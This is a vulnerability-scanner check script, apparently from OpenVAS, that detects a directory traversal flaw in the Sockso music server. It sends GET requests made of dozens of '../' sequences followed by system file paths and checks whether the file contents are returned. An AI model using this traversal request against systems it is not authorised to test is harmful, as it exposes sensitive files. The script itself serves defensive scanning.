# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802817");
  script_version("2025-08-27T05:39:13+0000");
  script_tag(name:"last_modification", value:"2025-08-27 05:39:13 +0000 (Wed, 27 Aug 2025)");
  script_tag(name:"creation_date", value:"2012-03-16 13:28:19 +0530 (Fri, 16 Mar 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_cve_id("CVE-2012-10061");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("Sockso < 1.5.1 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
  script_require_ports("Services/www", 4444);
  script_mandatory_keys("Sockso/banner");

  script_tag(name:"summary", value:"Sockso is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to improper validation of URI containing '../'
  or '..\' sequences, which allows attackers to read arbitrary files via directory traversal
  attacks.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to obtain sensitive
  information that could aid in further attacks.");

  script_tag(name:"affected", value:"Sockso version 1.5 and prior.");

  script_tag(name:"solution", value:"Update to version 1.5.1 or later.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18605/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/52509");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110828/sockso_1-adv.txt");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("os_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 4444);

banner = http_get_remote_headers(port: port);
if (!banner || "Server: Sockso" >!< banner)
  exit(0);

files = traversal_files();

foreach file (keys(files)) {
  url = "/" + crap(data: "../", length: 49) + files[file];

  if (http_vuln_check(port: port, url: "/file" + url, pattern:file)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
